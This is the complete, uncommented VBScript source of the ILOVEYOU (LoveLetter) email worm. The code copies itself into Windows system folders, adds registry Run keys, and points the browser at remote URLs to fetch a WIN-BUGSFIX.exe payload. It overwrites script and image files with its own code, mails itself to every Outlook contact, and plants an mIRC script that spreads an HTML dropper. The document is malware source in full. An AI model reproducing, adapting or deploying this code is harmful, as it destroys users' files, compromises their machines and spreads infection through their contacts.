Rem barok -loveletter(vbe) <i hate go to school>
Rem by: spyder / ispyder@mail.com / @GRAMMERSoft Group / Manila,Philippines
On Error Resume Next
Dim fso, dirsystem, dirwin, dirtemp, eq, ctr, file, vbscopy, dow
eq = ""
ctr = 0
Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.OpenTextFile(WScript.ScriptFullName, 1)
vbscopy = file.ReadAll
main()
Sub main()
On Error Resume Next
Dim wscr, rr
Set wscr = CreateObject("WScript.Shell")
rr = wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
If (rr >= 1) Then
wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout", 0, "REG_DWORD"
End If
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set c = fso.GetFile(WScript.ScriptFullName)
c.Copy (dirsystem & "\MSKernel32.vbs")
c.Copy (dirwin & "\Win32DLL.vbs")
c.Copy (dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
regruns()
html()
spreadtoemail()
listadriv()
End Sub
Sub regruns()
On Error Resume Next
Dim num, downread
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKernel32", dirsystem & "\MSKernel32.vbs"
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Win32DLL", dirwin & "\Win32DLL.vbs"
downread = ""
downread = regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
If (downread = "") Then
downread = "c:\"
End If
If (fileexist(dirsystem & "\WinFAT32.exe") = 1) Then
Randomize
num = Int((4 * Rnd) + 1)
If num = 1 Then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfmhPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
ElseIf num = 2 Then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqwerWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
ElseIf num = 3 Then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBdQZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
ElseIf num = 4 Then
regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page", "http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSDGjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN-BUGSFIX.exe"
End If
End If
If (fileexist(downread & "\WIN-BUGSFIX.exe") = 0) Then
regcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BUGSFIX", downread & "\WIN-BUGSFIX.exe"
regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "about:blank"
End If
End Sub
Sub listadriv()
On Error Resume Next
Dim d, dc, s
Set dc = fso.Drives
For Each d In dc
If d.DriveType = 2 Or d.DriveType = 3 Then
folderlist (d.Path & "\")
End If
Next
listadriv = s
End Sub
Sub infectfiles(folderspec)
On Error Resume Next
Dim f, f1, fc, ext, ap, mircfname, s, bname, mp3
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
For Each f1 In fc
ext = fso.GetExtensionName(f1.Path)
ext = LCase(ext)
s = LCase(f1.Name)
If (ext = "vbs") Or (ext = "vbe") Then
Set ap = fso.OpenTextFile(f1.Path, 2, True)
ap.write vbscopy
ap.Close
ElseIf (ext = "js") Or (ext = "jse") Or (ext = "css") Or (ext = "wsh") Or (ext = "sct") Or (ext = "hta") Then
Set ap = fso.OpenTextFile(f1.Path, 2, True)
ap.write vbscopy
ap.Close
bname = fso.GetBaseName(f1.Path)
Set cop = fso.GetFile(f1.Path)
cop.Copy (folderspec & "\" & bname & ".vbs")
fso.DeleteFile (f1.Path)
ElseIf (ext = "jpg") Or (ext = "jpeg") Then
Set ap = fso.OpenTextFile(f1.Path, 2, True)
ap.write vbscopy
ap.Close
Set cop = fso.GetFile(f1.Path)
cop.Copy (f1.Path & ".vbs")
fso.DeleteFile (f1.Path)
ElseIf (ext = "mp3") Or (ext = "mp2") Then
Set mp3 = fso.CreateTextFile(f1.Path & ".vbs")
mp3.write vbscopy
mp3.Close
Set att = fso.GetFile(f1.Path)
att.Attributes = att.Attributes + 2
End If
If (eq <> folderspec) Then
If (s = "mirc32.exe") Or (s = "mlink32.exe") Or (s = "mirc.ini") Or (s = "script.ini") Or (s = "mirc.hlp") Then
Set scriptini = fso.CreateTextFile(folderspec & "\script.ini")
scriptini.WriteLine "[script]"
scriptini.WriteLine ";mIRC Script"
scriptini.WriteLine "; Please dont edit this script... mIRC will corrupt, if mIRC will"
scriptini.WriteLine " corrupt... WINDOWS will affect and will not run correctly. thanks"
scriptini.WriteLine ";"
scriptini.WriteLine ";Khaled Mardam-Bey"
scriptini.WriteLine ";http://www.mirc.com"
scriptini.WriteLine ";"
scriptini.WriteLine "n0=on 1:JOIN:#:{"
scriptini.WriteLine "n1= /if ( $nick == $me ) { halt }"
scriptini.WriteLine "n2= /.dcc send $nick " & dirsystem & "\LOVE-LETTER-FOR-YOU.HTM"
scriptini.WriteLine "n3=}"
scriptini.Close
eq = folderspec
End If
End If
Next
End Sub
Sub folderlist(folderspec)
On Error Resume Next
Dim f, f1, sf
Set f = fso.GetFolder(folderspec)
Set sf = f.SubFolders
For Each f1 In sf
infectfiles (f1.Path)
folderlist (f1.Path)
Next
End Sub
Sub regcreate(regkey, regvalue)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite regkey, regvalue
End Sub
Function regget(value)
Set regedit = CreateObject("WScript.Shell")
regget = regedit.RegRead(value)
End Function
Function fileexist(filespec)
On Error Resume Next
Dim msg
If (fso.FileExists(filespec)) Then
msg = 0
Else
msg = 1
End If
fileexist = msg
End Function
Function folderexist(folderspec)
On Error Resume Next
Dim msg
If (fso.GetFolderExists(folderspec)) Then
msg = 0
Else
msg = 1
End If
fileexist = msg
End Function
Sub spreadtoemail()
On Error Resume Next
Dim x, a, ctrlists, ctrentries, malead, b, regedit, regv, regad
Set regedit = CreateObject("WScript.Shell")
Set out = WScript.CreateObject("Outlook.Application")
Set mapi = out.GetNameSpace("MAPI")
For ctrlists = 1 To mapi.AddressLists.Count
Set a = mapi.AddressLists(ctrlists)
x = 1
regv = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a)
If (regv = "") Then
regv = 1
End If
If (Int(a.AddressEntries.Count) > Int(regv)) Then
For ctrentries = 1 To a.AddressEntries.Count
malead = a.AddressEntries(x)
regad = ""
regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead)
If (regad = "") Then
Set male = out.CreateItem(0)
male.Recipients.Add (malead)
male.Subject = "ILOVEYOU"
male.Body = vbCrLf & "kindly check the attached LOVELETTER coming from me."
male.Attachments.Add (dirsystem & "\LOVE-LETTER-FOR-YOU.TXT.vbs")
male.Send
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, 1, "REG_DWORD"
End If
x = x + 1
Next
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
Else
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count
End If
Next
Set out = Nothing
Set mapi = Nothing
End Sub
Sub html()
On Error Resume Next
Dim lines, n, dta1, dta2, dt1, dt2, dt3, dt4, l1, dt5, dt6
dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS - LOVELETTER@-@>"&vbcrlf& _
"<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _
"<META NAME=@-@Description@-@ CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
"<?-?HEAD><BODY ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
"ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
"<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to Enable ActiveX<?-?p>"&vbcrlf& _
"<?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQUEE> "&vbcrlf& _
"<?-?BODY><?-?HTML>"&vbcrlf& _
"<SCRIPT language=@-@JScript@-@>"&vbcrlf& _
"<!--?-??-?"&vbcrlf& _
"if (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"&vbcrlf& _
"<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _
"<!--"&vbcrlf& _
"on error resume next"&vbcrlf& _
"dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _
"aw=1"&vbcrlf& _
"code="
dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
"set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _
"code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
"code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _
"code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _
"set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
"wri.write code4"&vbcrlf& _
"wri.close"&vbcrlf& _
"if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _
"if (err.number=424) then"&vbcrlf& _
"aw=0"&vbcrlf& _
"end if"&vbcrlf& _
"if (aw=1) then"&vbcrlf& _
"document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _
"window.close"&vbcrlf& _
"end if"&vbcrlf& _
"end if"&vbcrlf& _
"Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
"regedit.RegWrite @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _
"?-??-?-->"&vbcrlf& _
"<?-?SCRIPT>"
dt1 = Replace(dta1, Chr(35) & Chr(45) & Chr(35), "'")
dt1 = Replace(dt1, Chr(64) & Chr(45) & Chr(64), """")
dt4 = Replace(dt1, Chr(63) & Chr(45) & Chr(63), "/")
dt5 = Replace(dt4, Chr(94) & Chr(45) & Chr(94), "\")
dt2 = Replace(dta2, Chr(35) & Chr(45) & Chr(35), "'")
dt2 = Replace(dt2, Chr(64) & Chr(45) & Chr(64), """")
dt3 = Replace(dt2, Chr(63) & Chr(45) & Chr(63), "/")
dt6 = Replace(dt3, Chr(94) & Chr(45) & Chr(94), "\")
Set fso = CreateObject("Scripting.FileSystemObject")
Set c = fso.OpenTextFile(WScript.ScriptFullName, 1)
lines = Split(c.ReadAll, vbCrLf)
l1 = UBound(lines)
For n = 0 To UBound(lines)
lines(n) = Replace(lines(n), "'", Chr(91) + Chr(45) + Chr(91))
lines(n) = Replace(lines(n), """", Chr(93) + Chr(45) + Chr(93))
lines(n) = Replace(lines(n), "\", Chr(37) + Chr(45) + Chr(37))
If (l1 = n) Then
lines(n) = Chr(34) + lines(n) + Chr(34)
Else
lines(n) = Chr(34) + lines(n) + Chr(34) & "&vbcrlf& _"
End If
Next
Set b = fso.CreateTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM")
b.Close
Set d = fso.OpenTextFile(dirsystem + "\LOVE-LETTER-FOR-YOU.HTM", 2)
d.write dt5
d.write Join(lines, vbCrLf)
d.write vbCrLf
d.write dt6
d.Close
End Sub

 



